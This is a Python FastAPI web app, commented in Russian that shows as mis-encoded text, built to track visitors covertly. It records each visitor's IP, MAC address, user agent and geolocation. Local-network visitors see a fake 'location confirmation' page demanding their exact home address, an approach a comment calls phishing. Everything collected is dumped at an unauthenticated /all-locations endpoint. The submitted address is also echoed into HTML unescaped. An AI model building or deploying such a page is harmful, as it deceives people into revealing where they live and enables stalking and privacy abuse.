from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
import subprocess
import re
import socket
import requests
from datetime import datetime

app = FastAPI()

# –ö—ç—à –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
location_cache = {}


def get_mac(ip: str) -> str:
    """–ü–æ–ª—É—á–∞–µ–º MAC-–∞–¥—Ä–µ—Å"""
    try:
        cmd = ["arp", "-n", ip] if subprocess.os.name != "nt" else ["arp", "-a", ip]
        output = subprocess.check_output(cmd).decode(errors="ignore")
        mac = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", output)
        return mac.group(0) if mac else "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    except:
        return "–û—à–∏–±–∫–∞"


def get_approximate_location(ip: str) -> dict:
    """–û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ"""
    # –î–ª—è –ø—É–±–ª–∏—á–Ω—ã—Ö IP –∏—Å–ø–æ–ª—å–∑—É–µ–º API
    if not ip.startswith(('10.', '192.168.', '172.')):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,lat,lon")
            return response.json()
        except:
            pass

    # –î–ª—è –ª–æ–∫–∞–ª—å–Ω—ã—Ö IP –∏—Å–ø–æ–ª—å–∑—É–µ–º –∫—ç—à –∏ —Ñ–∏—à–∏–Ω–≥
    return {
        "status": "–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ",
        "country": "?",
        "city": "?",
        "isp": "–õ–æ–∫–∞–ª—å–Ω–∞—è —Å–µ—Ç—å",
        "lat": 0,
        "lon": 0
    }


@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    """–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ–º –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è"""
    client_ip = request.client.host
    mac = get_mac(client_ip)

    # –ü–æ–ª—É—á–∞–µ–º –∏–ª–∏ —Å–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏
    if client_ip not in location_cache:
        location = get_approximate_location(client_ip)
        location_cache[client_ip] = {
            "ip": client_ip,
            "mac": mac,
            "location": location,
            "last_seen": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_agent": request.headers.get("user-agent")
        }

    data = location_cache[client_ip]

    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–∞–∑–Ω—ã–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Å—Ç–∞—Ç—É—Å–∞
    if data["location"].get("status") == "–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ":
        return HTMLResponse(f"""
        <html>
        <head><title>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è</title></head>
        <body style="font-family: Arial; padding: 20px;">
            <h2>üîí –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è</h2>
            <p>–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–µ—Å—É—Ä—Å—É –Ω–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤–∞—à —Ä–µ–≥–∏–æ–Ω.</p>

            <div style="background: #f0f0f0; padding: 15px; border-radius: 5px;">
                <p>–í–∞—à–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</p>
                <ul>
                    <li>IP: {data['ip']}</li>
                    <li>MAC: {data['mac']}</li>
                    <li>–í—Ä–µ–º—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {data['last_seen']}</li>
                </ul>
            </div>

            <form method="post" style="margin-top: 20px;">
                <label>–í–∞—à —Ç–æ—á–Ω—ã–π –∞–¥—Ä–µ—Å –ø—Ä–æ–∂–∏–≤–∞–Ω–∏—è:</label><br>
                <input type="text" name="address" required style="width: 300px; padding: 8px;"><br>
                <button type="submit" style="margin-top: 10px; padding: 8px 15px;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
            </form>
        </body>
        </html>
        """)

    # –ï—Å–ª–∏ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –∏–∑–≤–µ—Å—Ç–Ω–æ
    return HTMLResponse(f"""
    <html>
    <head><title>–í–∞—à–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</title></head>
    <body style="font-family: Arial; padding: 20px;">
        <h1>üåç –í–∞—à–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</h1>

        <div style="background: #e0f7fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
            <h3>üìç {data['location'].get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}, {data['location'].get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}</h3>
            <p>–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: {data['location'].get('lat', '?')}, {data['location'].get('lon', '?')}</p>
            <p>–ü—Ä–æ–≤–∞–π–¥–µ—Ä: {data['location'].get('isp', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}</p>
        </div>

        <div style="background: #f5f5f5; padding: 15px; border-radius: 5px;">
            <p>–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</p>
            <ul>
                <li>IP: {data['ip']}</li>
                <li>MAC: {data['mac']}</li>
                <li>–ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {data['last_seen']}</li>
                <li>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {data['user_agent']}</li>
            </ul>
        </div>
    </body>
    </html>
    """)


@app.post("/", response_class=HTMLResponse)
async def save_location(request: Request, address: str = Form(...)):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –≤–≤–µ–¥–µ–Ω–Ω—ã–π –∞–¥—Ä–µ—Å"""
    client_ip = request.client.host
    mac = get_mac(client_ip)

    # –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
    location_cache[client_ip] = {
        "ip": client_ip,
        "mac": mac,
        "location": {
            "status": "success",
            "country": "–†–æ—Å—Å–∏—è",  # –ü—Ä–µ–¥–ø–æ–ª–æ–∂–µ–Ω–∏–µ
            "city": address.split(',')[0] if ',' in address else "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
            "address": address,
            "lat": "–ü—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω–æ",
            "lon": "–ü—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω–æ"
        },
        "last_seen": datetime.now().strftime("%d.%m.%Y %H:%M"),
        "user_agent": request.headers.get("user-agent")
    }

    return HTMLResponse(f"""
    <html>
    <head><title>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ</title></head>
    <body style="font-family: Arial; padding: 20px;">
        <h2>‚úÖ –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ!</h2>
        <p>–í–∞—à –∞–¥—Ä–µ—Å: <strong>{address}</strong></p>
        <p><a href="/">–í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞ –≥–ª–∞–≤–Ω—É—é</a></p>
    </body>
    </html>
    """)


@app.get("/all-locations")
async def show_all():
    """–ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ"""
    return location_cache


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)